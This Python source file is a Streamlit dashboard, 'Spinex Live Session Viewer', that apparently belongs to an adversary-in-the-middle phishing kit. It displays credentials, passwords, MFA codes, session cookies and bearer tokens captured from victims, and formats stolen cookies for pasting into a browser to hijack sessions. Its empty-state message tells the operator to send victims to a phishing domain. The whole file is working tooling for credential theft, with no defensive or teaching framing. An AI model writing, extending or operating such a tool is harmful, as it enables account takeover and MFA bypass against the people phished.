"""
session_viewer.py — Spinex Live Session Viewer

Reads creds/aitm_sessions.json and displays captured sessions
with auto-refresh, filtering, detail drill-down, and
copy-to-clipboard for stolen cookies and tokens.
"""

import streamlit as st
import os
import sys
import json
import time
import datetime

_AITM_DIR = os.path.dirname(os.path.abspath(__file__))
if _AITM_DIR not in sys.path:
    sys.path.insert(0, _AITM_DIR)
import config_manager as cm

import sys as _sys
_AITM_DIR    = os.path.dirname(os.path.abspath(__file__))
BASE_DIR     = os.path.dirname(_AITM_DIR)
if _AITM_DIR not in _sys.path:
    _sys.path.insert(0, _AITM_DIR)

CREDS_DIR     = os.path.join(BASE_DIR, "creds")
SESSIONS_FILE = os.path.join(CREDS_DIR, "aitm_sessions.json")

_CSS = """
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;700;800&display=swap');

:root {
    --bg:      #0a0a0f; --surface: #111118; --border: #1e1e2e;
    --accent:  #00ff9d; --accent2: #ff3c6e; --accent3: #7c5cff;
    --text:    #e2e2f0; --muted:   #6b6b8a;
    --ok:      #00ff9d; --warn:    #ffcc00; --fail:   #ff3c6e;
}
html, body, [data-testid="stAppViewContainer"], [data-testid="stMain"],
section.main { background: var(--bg) !important; color: var(--text) !important; }
[data-testid="stSidebar"] { background: var(--surface) !important; }
h1,h2,h3 { font-family:'Syne',sans-serif !important; font-weight:800 !important; letter-spacing:-0.03em; }

/* Metric cards */
.metric-row { display:flex; gap:12px; margin-bottom:1.2rem; }
.metric-card {
    flex:1; background:var(--surface); border:1px solid var(--border);
    border-radius:8px; padding:1rem 1.2rem; text-align:center;
}
.metric-label { font-size:0.68rem; font-weight:700; letter-spacing:0.15em;
                text-transform:uppercase; color:var(--muted); margin-bottom:4px; }
.metric-value { font-family:'JetBrains Mono',monospace; font-size:2rem; font-weight:700; color:var(--text); }
.metric-value.captured { color:var(--fail); }
.metric-value.active   { color:var(--warn); }
.metric-value.ok       { color:var(--ok);   }

/* Session cards */
.session-card {
    background:var(--surface); border:1px solid var(--border);
    border-radius:8px; padding:1rem 1.2rem; margin-bottom:0.6rem;
    cursor:pointer; transition: border-color 0.15s;
}
.session-card:hover { border-color: var(--accent3); }
.session-card.captured { border-left:3px solid var(--fail); }
.session-card.active   { border-left:3px solid var(--warn); }
.session-card.new      { border-left:3px solid var(--muted); }
.session-header { display:flex; align-items:center; gap:12px; }
.session-id { font-family:'JetBrains Mono',monospace; font-size:0.78rem;
              color:var(--muted); letter-spacing:0.08em; }
.session-identity { font-family:'JetBrains Mono',monospace; font-size:0.9rem;
                    font-weight:700; color:var(--text); flex:1; }
.session-time { font-family:'JetBrains Mono',monospace; font-size:0.72rem; color:var(--muted); }

/* Badges */
.badge { display:inline-block; padding:2px 10px; border-radius:100px;
         font-family:'JetBrains Mono',monospace; font-size:0.7rem;
         font-weight:700; letter-spacing:0.05em; }
.badge-captured { background:#ff3c6e18; color:var(--fail); border:1px solid #ff3c6e55; }
.badge-active   { background:#ffcc0018; color:var(--warn); border:1px solid #ffcc0055; }
.badge-new      { background:#6b6b8a18; color:var(--muted); border:1px solid #6b6b8a55; }
.badge-platform { background:#7c5cff18; color:var(--accent3); border:1px solid #7c5cff55; }

/* Detail sections */
.detail-section {
    background:#0d0d16; border:1px solid var(--border); border-radius:6px;
    padding:1rem; margin-bottom:0.8rem;
}
.detail-section-title {
    font-size:0.68rem; font-weight:700; letter-spacing:0.15em;
    text-transform:uppercase; color:var(--muted); margin-bottom:0.6rem;
}
.kv-row { display:flex; gap:8px; padding:4px 0;
          border-bottom:1px solid #1a1a28; font-family:'JetBrains Mono',monospace;
          font-size:0.8rem; align-items:flex-start; }
.kv-key   { color:var(--accent3); min-width:180px; flex-shrink:0; }
.kv-value { color:var(--text); word-break:break-all; flex:1; }
.kv-value.password { color:var(--fail); }
.kv-value.token    { color:var(--accent); font-size:0.72rem; }

/* Cookie card */
.cookie-card { background:#0a0a0f; border:1px solid #1e1e2e; border-radius:4px;
               padding:0.6rem 0.8rem; margin-bottom:0.4rem; }
.cookie-name  { font-family:'JetBrains Mono',monospace; font-size:0.78rem;
                color:var(--accent3); font-weight:700; }
.cookie-value { font-family:'JetBrains Mono',monospace; font-size:0.72rem;
                color:var(--accent); word-break:break-all; margin-top:2px; }
.cookie-meta  { font-family:'JetBrains Mono',monospace; font-size:0.68rem;
                color:var(--muted); margin-top:2px; }

/* Timeline */
.timeline-item { display:flex; gap:12px; padding:5px 0;
                 border-bottom:1px solid #1a1a28;
                 font-family:'JetBrains Mono',monospace; font-size:0.78rem; }
.timeline-ts   { color:var(--muted); min-width:90px; flex-shrink:0; }
.timeline-event { color:var(--text); }
.timeline-event.captured { color:var(--fail); font-weight:700; }
.timeline-event.active   { color:var(--warn); }

/* Empty state */
.empty-state { text-align:center; padding:4rem 2rem; color:var(--muted); }
.empty-icon  { font-size:3rem; margin-bottom:1rem; }
.empty-title { font-family:'Syne',sans-serif; font-size:1.2rem; font-weight:800;
               color:var(--text); margin-bottom:0.5rem; }

.accent-line { width:40px; height:3px; background:var(--accent); border-radius:2px; margin-bottom:0.5rem; }
</style>
"""

def delete_sessions(session_ids: list[str]) -> int:
    """
    Remove sessions with the given IDs from aitm_sessions.json.
    Returns the number of sessions deleted.
    """
    if not os.path.exists(SESSIONS_FILE):
        return 0
    ids_to_delete = set(session_ids)
    kept = []
    deleted = 0
    try:
        with open(SESSIONS_FILE, "r", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    rec = json.loads(line)
                    if rec.get("id") in ids_to_delete:
                        deleted += 1
                    else:
                        kept.append(line)
                except Exception:
                    kept.append(line)
        with open(SESSIONS_FILE, "w") as f:
            f.write("\n".join(kept) + ("\n" if kept else ""))
    except Exception:
        pass
    return deleted


def load_sessions() -> list[dict]:
    """Load all sessions from aitm_sessions.json (JSONL format)."""
    if not os.path.exists(SESSIONS_FILE):
        return []
    sessions = {}
    try:
        with open(SESSIONS_FILE, "r", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    rec = json.loads(line)
                    # Last record for each ID wins (latest state)
                    sessions[rec["id"]] = rec
                except Exception:
                    pass
    except Exception:
        pass
    # Sort: captured first, then active, then new; most recent first within each group
    order = {"captured": 0, "active": 1, "new": 2}
    return sorted(
        sessions.values(),
        key=lambda s: (order.get(s.get("status", "new"), 2), s.get("last_seen", "")),
        reverse=False,
    )


def _identity(session: dict) -> str:
    """Extract best available identity string from a session."""
    for cred in session.get("credentials", []):
        for v in cred.get("username", {}).values():
            if v:
                return str(v)
    for hdr_entry in session.get("auth_headers", []):
        auth = hdr_entry.get("headers", {}).get("authorization", {})
        for key in ("email", "upn", "preferred_username", "sub"):
            if auth.get(key):
                return str(auth[key])
    return "unknown"


def _fmt_ts(ts: str) -> str:
    """Shorten a timestamp for display."""
    try:
        dt = datetime.datetime.fromisoformat(str(ts))
        return dt.strftime("%m-%d %H:%M:%S")
    except Exception:
        return str(ts)[:19]

def _badge(text: str, kind: str) -> str:
    return f'<span class="badge badge-{kind}">{text}</span>'


def _render_metrics(sessions: list[dict]) -> None:
    total    = len(sessions)
    captured = sum(1 for s in sessions if s.get("status") == "captured")
    active   = sum(1 for s in sessions if s.get("status") == "active")
    new      = sum(1 for s in sessions if s.get("status") == "new")

    st.markdown(
        f'<div class="metric-row">'
        f'<div class="metric-card"><div class="metric-label">Total Sessions</div>'
        f'<div class="metric-value ok">{total}</div></div>'
        f'<div class="metric-card"><div class="metric-label">Captured</div>'
        f'<div class="metric-value captured">{captured}</div></div>'
        f'<div class="metric-card"><div class="metric-label">Active</div>'
        f'<div class="metric-value active">{active}</div></div>'
        f'<div class="metric-card"><div class="metric-label">New</div>'
        f'<div class="metric-value">{new}</div></div>'
        f'</div>',
        unsafe_allow_html=True,
    )


def _render_session_row(session: dict, idx: int) -> None:
    """Render one session as an expander with full detail inside."""
    status   = session.get("status", "new")
    identity = _identity(session)
    platform = session.get("platform", "unknown")
    sid      = session.get("id", "")[:8]

    status_badge    = _badge(status.upper(), status)
    platform_badge  = _badge(platform, "platform")

    label = f"{identity}  ·  {platform}  ·  {status.upper()}  ·  {_fmt_ts(session.get('last_seen',''))}"

    with st.expander(label, expanded=(status == "captured")):
        _render_session_detail(session)


def _render_session_detail(session: dict) -> None:
    """Full detail view for one session."""
    status   = session.get("status", "new")
    platform = session.get("platform", "unknown")

    col1, col2, col3 = st.columns(3)
    col1.markdown(
        f'{_badge(status.upper(), status)} &nbsp; {_badge(platform, "platform")}',
        unsafe_allow_html=True,
    )
    col2.markdown(
        f'<span style="font-family:\'JetBrains Mono\',monospace;font-size:0.78rem;color:var(--muted);">'
        f'ID: {session.get("id","")}</span>',
        unsafe_allow_html=True,
    )
    col3.markdown(
        f'<span style="font-family:\'JetBrains Mono\',monospace;font-size:0.78rem;color:var(--muted);">'
        f'IP: {session.get("ip","unknown")}</span>',
        unsafe_allow_html=True,
    )

    t_creds, t_cookies, t_headers, t_timeline = st.tabs([
        "🔑 Credentials", "🍪 Session Cookies", "🔗 Auth Headers", "📅 Timeline"
    ])

    with t_creds:
        creds_list = session.get("credentials", [])
        if not creds_list:
            st.markdown('<p style="color:var(--muted);">No credentials captured yet.</p>',
                        unsafe_allow_html=True)
        for i, cred in enumerate(creds_list):
            st.markdown(
                f'<div class="detail-section-title">Submission {i+1} — {_fmt_ts(cred.get("timestamp",""))}</div>',
                unsafe_allow_html=True,
            )
            rows = ""
            for bucket, label in (("username", "Username"), ("password", "Password"), ("mfa", "MFA")):
                for key, val in cred.get(bucket, {}).items():
                    css_cls = "password" if bucket == "password" else ""
                    rows += (
                        f'<div class="kv-row">'
                        f'<span class="kv-key">{label} · {key}</span>'
                        f'<span class="kv-value {css_cls}">{val}</span>'
                        f'</div>'
                    )
            if rows:
                st.markdown(f'<div class="detail-section">{rows}</div>', unsafe_allow_html=True)
            # Copy raw JSON
            st.code(json.dumps(cred, indent=2), language="json")

    with t_cookies:
        cookie_entries = session.get("cookies", [])
        if not cookie_entries:
            st.markdown('<p style="color:var(--muted);">No session cookies captured yet.</p>',
                        unsafe_allow_html=True)
        for entry in cookie_entries:
            st.markdown(
                f'<div class="detail-section-title">{_fmt_ts(entry.get("timestamp",""))} — {entry.get("url","")[:60]}</div>',
                unsafe_allow_html=True,
            )
            cookies = entry.get("cookies", {})
            cookie_html = ""
            for name, data in cookies.items():
                val = data.get("value", "") if isinstance(data, dict) else str(data)
                plat = data.get("platform", "") if isinstance(data, dict) else ""
                cookie_html += (
                    f'<div class="cookie-card">'
                    f'<div class="cookie-name">{name}</div>'
                    f'<div class="cookie-value">{val}</div>'
                    f'<div class="cookie-meta">{plat}</div>'
                    f'</div>'
                )
            if cookie_html:
                st.markdown(f'<div class="detail-section">{cookie_html}</div>',
                            unsafe_allow_html=True)

            # Full JSON for copy-paste into browser devtools
            st.markdown("**Copy-ready (DevTools format):**")
            devtools_fmt = "; ".join(
                f"{name}={data.get('value','') if isinstance(data,dict) else data}"
                for name, data in cookies.items()
            )
            st.code(devtools_fmt, language="text")

    with t_headers:
        header_entries = session.get("auth_headers", [])
        if not header_entries:
            st.markdown('<p style="color:var(--muted);">No auth headers captured yet.</p>',
                        unsafe_allow_html=True)
        for entry in header_entries:
            st.markdown(
                f'<div class="detail-section-title">'
                f'{entry.get("method","GET")} — {_fmt_ts(entry.get("timestamp",""))}</div>',
                unsafe_allow_html=True,
            )
            headers = entry.get("headers", {})
            rows = ""
            for hname, hval in headers.items():
                if hname.lower() == "authorization" and isinstance(hval, dict):
                    # Surface key JWT claims first
                    for claim in ("scheme","email","upn","sub","tid","scp","exp"):
                        if claim in hval:
                            rows += (
                                f'<div class="kv-row">'
                                f'<span class="kv-key">auth.{claim}</span>'
                                f'<span class="kv-value token">{hval[claim]}</span>'
                                f'</div>'
                            )
                    # Raw token
                    if "token" in hval:
                        rows += (
                            f'<div class="kv-row">'
                            f'<span class="kv-key">raw token</span>'
                            f'<span class="kv-value token">{str(hval["token"])[:120]}…</span>'
                            f'</div>'
                        )
                else:
                    rows += (
                        f'<div class="kv-row">'
                        f'<span class="kv-key">{hname}</span>'
                        f'<span class="kv-value token">{str(hval)[:120]}</span>'
                        f'</div>'
                    )
            if rows:
                st.markdown(f'<div class="detail-section">{rows}</div>', unsafe_allow_html=True)
            st.code(json.dumps(entry.get("headers", {}), indent=2), language="json")

    with t_timeline:
        events = []
        events.append((session.get("first_seen",""), "First request seen", "new"))

        for cred in session.get("credentials", []):
            identity_str = next(iter(cred.get("username",{}).values()), "unknown")
            events.append((cred.get("timestamp",""), f"Credentials submitted — {identity_str}", "active"))

        for hdr in session.get("auth_headers", []):
            scheme = hdr.get("headers",{}).get("authorization",{}).get("scheme","token")
            events.append((hdr.get("timestamp",""), f"Auth header captured ({scheme})", "active"))

        for ck in session.get("cookies", []):
            names = list(ck.get("cookies",{}).keys())
            events.append((ck.get("timestamp",""), f"Session cookies captured: {', '.join(names[:3])}", "captured"))

        events.append((session.get("last_seen",""), f"Status: {session.get('status','').upper()}", session.get("status","new")))

        # Sort by timestamp
        events.sort(key=lambda e: e[0])

        html = ""
        for ts, event, kind in events:
            html += (
                f'<div class="timeline-item">'
                f'<span class="timeline-ts">{_fmt_ts(ts)}</span>'
                f'<span class="timeline-event {kind}">{event}</span>'
                f'</div>'
            )
        st.markdown(f'<div class="detail-section">{html}</div>', unsafe_allow_html=True)

        # Export full session JSON
        st.markdown("**Full session JSON:**")
        st.code(json.dumps(session, indent=2), language="json")

def render() -> None:
    st.markdown(_CSS, unsafe_allow_html=True)
    st.markdown('<div class="accent-line"></div>', unsafe_allow_html=True)
    st.markdown("# 🎯 Live Session Viewer")
    st.markdown(
        '<p style="color:var(--muted);margin-top:-0.5rem;">'
        'Real-time view of captured AiTM sessions — credentials, cookies, and tokens.</p>',
        unsafe_allow_html=True,
    )

    # Init selection state
    if "selected_sessions" not in st.session_state:
        st.session_state.selected_sessions = set()

    col_r, col_f, col_export, col_del, col_auto = st.columns([1, 2, 1, 1, 1])

    with col_r:
        if st.button("🔄 Refresh", use_container_width=True):
            st.rerun()

    with col_f:
        filter_status = st.selectbox(
            "Filter by status",
            options=["all", "captured", "active", "new"],
            label_visibility="collapsed",
        )

    with col_export:
        sessions_raw = load_sessions()
        if sessions_raw:
            export_data = json.dumps(sessions_raw, indent=2)
            st.download_button(
                "⬇️ Export JSON",
                data=export_data,
                file_name=f"spinex_sessions_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
                mime="application/json",
                use_container_width=True,
            )

    with col_del:
        selected = st.session_state.selected_sessions
        btn_label = f"🗑️ Delete ({len(selected)})" if selected else "🗑️ Delete"
        if st.button(btn_label, use_container_width=True,
                     disabled=len(selected) == 0,
                     type="primary" if selected else "secondary"):
            n = delete_sessions(list(selected))
            st.session_state.selected_sessions = set()
            st.toast(f"Deleted {n} session{'s' if n != 1 else ''}", icon="🗑️")
            st.rerun()

    with col_auto:
        auto_refresh = st.toggle("Auto-refresh", value=False)

    st.divider()

    sessions = load_sessions()
    if filter_status != "all":
        sessions = [s for s in sessions if s.get("status") == filter_status]

    _render_metrics(load_sessions())

    if sessions:
        all_ids = {s["id"] for s in sessions}
        col_sa, col_da, _ = st.columns([1, 1, 6])
        with col_sa:
            if st.button("☑️ Select all", use_container_width=True):
                st.session_state.selected_sessions = all_ids
                st.rerun()
        with col_da:
            if st.button("⬜ Deselect all", use_container_width=True):
                st.session_state.selected_sessions = set()
                st.rerun()

    if not sessions:
        icon  = "🎯" if filter_status == "all" else "🔍"
        title = "No sessions captured yet" if filter_status == "all" else f"No '{filter_status}' sessions"
        sub   = ("Start the proxy and send victims to your phishing domain."
                 if filter_status == "all" else "Try a different filter.")
        st.markdown(
            f'<div class="empty-state">'
            f'<div class="empty-icon">{icon}</div>'
            f'<div class="empty-title">{title}</div>'
            f'<p>{sub}</p>'
            f'</div>',
            unsafe_allow_html=True,
        )
    else:
        st.markdown(
            f'<p style="color:var(--muted);font-size:0.82rem;margin-bottom:0.5rem;">'
            f'Showing {len(sessions)} session{"s" if len(sessions)!=1 else ""}'
            f'{" (filtered)" if filter_status != "all" else ""} — '
            f'most critical first.</p>',
            unsafe_allow_html=True,
        )
        for i, session in enumerate(sessions):
            sid      = session.get("id", "")
            identity = _identity(session)
            platform = session.get("platform", "unknown")
            status   = session.get("status", "new")

            # Checkbox + expander side by side
            col_chk, col_exp = st.columns([0.3, 9.7])
            with col_chk:
                checked = st.checkbox(
                    "",
                    value=sid in st.session_state.selected_sessions,
                    key=f"chk_{sid}",
                    label_visibility="collapsed",
                )
                if checked:
                    st.session_state.selected_sessions.add(sid)
                else:
                    st.session_state.selected_sessions.discard(sid)

            with col_exp:
                label = f"{identity}  ·  {platform}  ·  {status.upper()}  ·  {_fmt_ts(session.get('last_seen',''))}"
                with st.expander(label, expanded=(status == "captured")):
                    _render_session_detail(session)

    if auto_refresh:
        time.sleep(5)
        st.rerun()

if __name__ == "__main__":
    st.set_page_config(
        page_title="Spinex — Sessions",
        page_icon="🎯",
        layout="wide",
        initial_sidebar_state="collapsed",
    )
    render()